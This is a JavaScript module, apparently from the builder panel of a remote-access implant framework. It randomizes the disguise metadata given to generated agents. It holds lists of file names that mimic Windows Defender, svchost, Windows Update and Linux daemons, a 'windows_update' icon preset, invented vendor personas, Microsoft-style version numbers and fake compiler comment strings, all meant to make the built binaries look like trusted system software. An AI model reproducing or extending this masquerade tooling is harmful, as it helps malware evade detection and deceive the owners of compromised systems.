// panel/js/builder/randomize.js
//
// Artifact-customization randomizer for the agent builder.
//
// Exposes window.ArtifactRandomizer.randomize(), which fills the artifact
// fields (filename, icon preset, PE VERSIONINFO, ELF .comment) with
// plausible, internally consistent, backend-valid values for the currently
// selected platform. Fields that don't apply to the platform are cleared
// so they never reach the build payload.
//
// Backend constraints honored here:
//   * artifact name  -> ^[A-Za-z0-9._-]{1,64}$
//   * icon preset    -> one of the five stock values (or empty)
//   * version fields -> free-form strings; we emit dotted numeric quads
//   * ELF comment    -> free-form string
//
// Loaded before js/builder.js; builder.js degrades gracefully (error
// toast) if this file is missing.

(function () {
    'use strict';

    // ── Vendor personas: company / product / description stay coherent ──

    var PERSONAS = [
        { company: 'Northwind Analytics Ltd.',       product: 'Northwind Data Collector',    desc: 'Background telemetry collection agent for Northwind dashboards' },
        { company: 'BluePeak Technologies',          product: 'BluePeak Health Service',     desc: 'System health monitoring service component' },
        { company: 'Orbit Systems, Inc.',            product: 'Orbit Update Manager',        desc: 'Keeps Orbit products up to date on schedule' },
        { company: 'Cascade Digital Systems',        product: 'Cascade Print Assistant',     desc: 'Print queue management helper' },
        { company: 'IronClad Security Products',     product: 'IronClad Vault Helper',       desc: 'Credential vault background helper process' },
        { company: 'Meridian Software Solutions',    product: 'Meridian Report Generator',   desc: 'Scheduled report generation agent' },
        { company: 'Halcyon Technologies',           product: 'Halcyon Disk Optimizer',      desc: 'Disk maintenance scheduled task module' },
        { company: 'Stratus Computing Group',        product: 'Stratus Metrics Collector',   desc: 'Performance metrics collection daemon' },
        { company: 'Pinnacle Softworks',             product: 'Pinnacle Backup Scheduler',   desc: 'Automated backup scheduling service' },
        { company: 'Apex Systems Ltd.',              product: 'Apex Log Uploader',           desc: 'Uploads diagnostic logs to the vendor portal' },
        { company: 'Vantage Point Software',         product: 'Vantage Sync Client',         desc: 'Folder synchronization client' },
        { company: 'Redwood Dynamics GmbH',          product: 'Redwood Fleet Monitor',       desc: 'Endpoint fleet status monitoring agent' },
        { company: 'Kestrel Works',                  product: 'Kestrel Update Bridge',       desc: 'In-place updater bridge component' },
        { company: 'Lumenware Corp.',                product: 'Lumen Diagnostics Hub',       desc: 'Diagnostics upload and aggregation service' },
        { company: 'Granite Bay Software',           product: 'Granite Policy Enforcer',     desc: 'Applies endpoint policy bundles on a timer' },
        { company: 'Silverline Systems',             product: 'Silverline Cache Manager',    desc: 'Local cache compaction and cleanup utility' },
        { company: 'Beacon Hill Technologies',       product: 'Beacon Asset Reporter',       desc: 'Hardware inventory reporting agent' },
        { company: 'Clearpath Software Co.',         product: 'Clearpath Config Agent',      desc: 'Centralized configuration distribution client' },
        { company: 'Foundry Digital, LLC',           product: 'Foundry Telemetry Service',   desc: 'Application performance telemetry uploader' },
        { company: 'Obsidian Labs',                  product: 'Obsidian Watchdog',           desc: 'Process supervision and auto-restart daemon' },
        { company: 'TrueNorth Computing',            product: 'TrueNorth Inventory Sync',    desc: 'Inventory data synchronization module' },
        { company: 'Bluebird Systems',               product: 'Bluebird Patch Relay',        desc: 'Staged patch distribution relay service' },
        { company: 'Ironwood Technologies',          product: 'Ironwood Health Probe',       desc: 'Periodic system health probe utility' },
        { company: 'Summit Ridge Software',          product: 'Summit Report Scheduler',     desc: 'Report generation scheduling service' },
    ];

    // ── Artifact filenames (no extension - added per format) ────────────

    var WIN_ARTIFACT_NAMES = [
        'OneDriveHealthMonitor', 'DefenderDefinitionCheck', 'PrintWorkflowHost',
        'SvcHostUpdateTask', 'WindowsHealthService', 'SystemTelemetryFlush',
        'EdgeUpdateBootstrap', 'ShellExperienceCheck', 'WmiApSrvHelper',
        'TaskSchedulerHealth', 'WinUpdateHealthSvc', 'CloudSyncValidator',
        'DeviceSetupManager', 'StorageHealthCheck', 'WindowsErrorReporter',
        'SysmainOptimizer', 'DotNetUpdateCheck', 'SecureBootStatus',
        'TimeSyncAssistant', 'NetworkProfileSvc', 'AppReadinessHelper',
        'BackgroundUploadTask', 'LicenseCheckModule', 'MaintenanceTrigger',
    ];

    var LINUX_ARTIFACT_NAMES = [
        'svc-health-probe', 'telemetry-agentd', 'update-checker', 'sysmon-helper',
        'cron-refresh', 'daemon-watchdog', 'metricbeat-shim', 'logrotate-worker',
        'net-monitor', 'syshealth-probe', 'audit-upload', 'cache-prune',
        'config-syncd', 'inventory-scan', 'patch-relayd', 'disk-usage-reporter',
        'journal-uploader', 'svc-status-poller', 'package-cache-updater',
        'cron-telemetry', 'node-health-agent', 'log-shipper', 'time-sync-daemon',
        'fw-rules-check',
    ];

    var MAC_ARTIFACT_NAMES = [
        'InstallHelper', 'UpdateDaemon', 'SystemHealthCheck', 'AppUpdateService',
        'SyncStatusMonitor', 'BackgroundReporter', 'MaintenanceDaemon',
        'AssetInventory', 'ConfigFetcher', 'DiagnosticsUploader',
        'PolicyCheckRunner', 'CacheCleaner',
    ];

    // ── Icon presets (backend accepts exactly these five) ───────────────

    var ICON_PRESETS = ['generic_system', 'windows_update', 'driver', 'media_player', 'document'];

    // ── ELF .comment strings (readelf -p .comment) ──────────────────────

    var ELF_COMMENTS = [
        'GCC: (GNU) 11.3.0',
        'GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0',
        'GCC: (Debian 12.2.0-14) 12.2.0',
        'GCC: (Alpine 13.2.1_git20231014) 13.2.1',
        'GCC: (Red Hat 8.5.0-10) 8.5.0 20210514',
        'GCC: (GNU) 13.2.0',
        'clang version 14.0.6 (Fedora 14.0.6-2.fc36)',
        'clang version 15.0.7 (15.0.7-3.el9)',
        'clang version 17.0.6 (Ubuntu 17.0.6-9ubuntu1)',
        'rustc version 1.75.0',
        'rustc version 1.79.0',
        'musl-gcc 1.2.4',
        'Linker: LLD 14.0.6',
        'go version go1.22.5 linux/amd64',
        'build-id: ' ,  // completed dynamically below
    ];

    // ── Helpers ─────────────────────────────────────────────────────────

    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

    function randInt(min, max) { // inclusive both ends
        return min + Math.floor(Math.random() * (max - min + 1));
    }

    function setFieldVal(id, value) {
        var el = document.getElementById(id);
        if (el) el.value = value;
    }

    function clearArtifactFields() {
        setFieldVal('builder-icon-preset', '');
        setFieldVal('builder-pe-company', '');
        setFieldVal('builder-pe-product', '');
        setFieldVal('builder-pe-description', '');
        setFieldVal('builder-pe-file-version', '');
        setFieldVal('builder-pe-product-version', '');
        setFieldVal('builder-elf-comment', '');
    }

    // ── Version generators ──────────────────────────────────────────────
    // PE version strings are free-form, but real binaries follow a few
    // recognizable shapes - emit one of them at random.

    // Windows-style: 10.0.<build>.<revision> (looks like an OS component)
    function msVersion() {
        return '10.0.' + randInt(19041, 26000) + '.' + randInt(1000, 9899);
    }

    // Independent vendor quad: <major>.<minor>.<patch>.<build>
    function vendorVersion() {
        return randInt(1, 12) + '.' + randInt(0, 20) + '.' + randInt(0, 50) + '.' + randInt(0, 999);
    }

    // Mature product: high major, reset counters
    function matureVersion() {
        return randInt(3, 9) + '.' + randInt(0, 5) + '.' + randInt(0, 15) + '.' + randInt(0, 99);
    }

    // Fresh release: 1.0.x with a low build counter
    function freshVersion() {
        return '1.0.' + randInt(0, 9) + '.' + randInt(0, 99);
    }

    function randomVersion() {
        var roll = Math.random();
        if (roll < 0.40) return msVersion();
        if (roll < 0.70) return vendorVersion();
        if (roll < 0.90) return matureVersion();
        return freshVersion();
    }

    function randomElfComment() {
        var c = pick(ELF_COMMENTS);
        if (c === 'build-id: ') {
            // 40 lowercase hex chars, GNU build-id style
            var hex = '';
            for (var i = 0; i < 40; i++) hex += '0123456789abcdef'[randInt(0, 15)];
            return 'build-id: ' + hex;
        }
        return c;
    }

    // ── Entry point ─────────────────────────────────────────────────────

    function randomize() {
        var platEl   = document.getElementById('builder-platform');
        var platform = platEl ? platEl.value : 'linux';

        if (platform === 'windows') {
            var p = pick(PERSONAS);
            setFieldVal('builder-name', pick(WIN_ARTIFACT_NAMES));
            setFieldVal('builder-icon-preset', pick(ICON_PRESETS));
            setFieldVal('builder-pe-company', p.company);
            setFieldVal('builder-pe-product', p.product);
            setFieldVal('builder-pe-description', p.desc);
            setFieldVal('builder-pe-file-version', randomVersion());
            setFieldVal('builder-pe-product-version', randomVersion());
            setFieldVal('builder-elf-comment', '');
        } else if (platform === 'linux' || platform === 'linux-musl') {
            clearArtifactFields();
            setFieldVal('builder-name', pick(LINUX_ARTIFACT_NAMES));
            setFieldVal('builder-elf-comment', randomElfComment());
        } else {
            // macOS has no platform-specific artifact fields beyond the name
            clearArtifactFields();
            setFieldVal('builder-name', pick(MAC_ARTIFACT_NAMES));
        }

        if (window.Notify) {
            window.Notify.toast('Artifact fields randomized for ' + platform + '.', 'info', 3000);
        }
    }

    window.ArtifactRandomizer = { randomize: randomize };
}());
